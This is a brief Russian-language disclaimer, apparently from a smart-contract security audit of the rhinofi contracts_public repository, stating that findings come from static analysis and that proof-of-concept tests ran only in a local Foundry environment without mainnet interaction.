Данный анализ основан на публично доступном исходном коде из https://github.com/rhinofi/contracts_public и документации. Все выводы являются теоретическими и были получены с помощью статического анализа кода. Никакой активной эксплуатации, ончейн-транзакций или взаимодействия с контрактами в mainnet не производилось. Никакие приватные ключи, API или пользовательские данные не были использованы. PoC-тесты выполняются исключительно в виртуальной среде Foundry и не взаимодействуют с реальными сетями.
